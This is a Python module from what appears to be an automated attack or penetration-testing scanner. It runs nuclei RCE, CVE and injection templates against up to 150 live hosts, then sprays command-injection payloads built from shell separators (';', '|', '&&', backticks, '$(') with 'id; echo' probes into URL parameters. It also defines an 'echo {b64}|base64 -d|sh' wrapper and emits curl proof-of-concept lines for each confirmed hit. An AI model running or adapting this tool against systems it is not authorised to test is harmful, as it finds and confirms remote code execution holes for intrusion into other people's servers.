from __future__ import annotations
import asyncio, json, re
from .base import Finding, Module, marker

SEPS = [";", "|", "&&", "||", "%0a", "`", "$("]
WRAPS = ["{cmd}", "echo {b64}|base64 -d|sh"]


class RCE(Module):
    name = "rce"
    phase = 7

    async def run(self):
        ctx = self.ctx
        live = await ctx.store.get_state(ctx.job_id, "live") or []
        findings: list[Finding] = []

        # A. nuclei — template RCE/CVE/injection
        targets = "\n".join(e["url"] for e in live[:150])
        rc, out, _ = await self.tool([
            "nuclei", "-silent", "-jsonl", "-severity",
            ",".join(ctx.cfg.get("vuln.nuclei_severity", ["critical", "high"])),
            "-tags", "rce,cve,injection,deserialization,ognl,ssti",
            "-rl", "120", "-timeout", "12"], stdin=targets, timeout=1800)
        ctx.save("nuclei-rce.jsonl", out)
        for line in out.splitlines():
            try:
                j = json.loads(line)
            except Exception:
                continue
            findings.append(await self.emit(Finding(
                kind="rce", title=j.get("info", {}).get("name", "RCE (nuclei)"),
                target=j.get("matched-at") or j.get("host", ""),
                severity=j.get("info", {}).get("severity", "high"),
                confidence="tentative",
                evidence=(j.get("template-id") or "") + "\n" + str(j.get("extracted-results") or ""),
                repro=[f"nuclei -u {j.get('matched-at','')} -id {j.get('template-id','')}"],
                data={"template": j.get("template-id"), "raw": j,
                      "vector": "nuclei", "url": j.get("matched-at", "")})))

        # B. command injection refleksi
        urls = await ctx.store.get_state(ctx.job_id, "param_urls") or []
        for url in urls[:90]:
            ctx.check()
            hit = await self._probe(url)
            if hit:
                findings.append(await self.emit(Finding(
                    kind="rce", title="Command injection terkonfirmasi",
                    target=hit["url"], severity="critical", confidence="tentative",
                    evidence=f"marker={hit['marker']} sep={hit['sep']!r}\n{hit['proof']}",
                    repro=[f"curl -s '{hit['url']}' | grep -o 'uid=[0-9]*'"],
                    poc=f"curl -s '{hit['url']}'",
                    data={"vector": "cmdinject", "url": hit["url"],
                          "param": hit["param"], "sep": hit["sep"],
                          "marker": hit["marker"]})))
        return findings

    async def _probe(self, url: str):
        ctx = self.ctx
        m = marker()
        for sep in SEPS:
            for wrapped in (f"echo {m}", f"id; echo {m}"):
                inj = url + ("&" if "?" in url else "?") + f"x=1{sep}{wrapped}"
                try:
                    r = await ctx.http.get(inj, timeout=12)
                except Exception:
                    continue
                if m in r.text or "uid=" in r.text:
                    proof = re.search(rf"{m}|uid=\d+\([^)]+\)", r.text)
                    return {"url": inj, "param": "x", "sep": sep, "marker": m,
                            "proof": proof.group(0) if proof else ""}
        return None

    async def verify(self, f: Finding) -> bool:
        """Replay 2x dengan marker baru — harus konsisten."""
        if f.data.get("vector") == "cmdinject":
            ok = 0
            for _ in range(2):
                if await self._probe(f.data["url"].split("?")[0]) is not None or \
                   await self._replay(f):
                    ok += 1
                await asyncio.sleep(0.4)
            f.hits = ok
            return ok == 2
        if f.data.get("vector") == "nuclei":
            rc, out, _ = await self.tool(
                ["nuclei", "-silent", "-u", f.target, "-id", f.data.get("template", ""),
                 "-timeout", "15"], timeout=180)
            f.hits = 1 if out.strip() else 0
            return bool(out.strip())
        return False

    async def _replay(self, f: Finding) -> bool:
        m = marker()
        try:
            r = await self.ctx.http.get(f.data["url"] + f"echo {m}", timeout=12)
        except Exception:
            return False
        return m in r.text
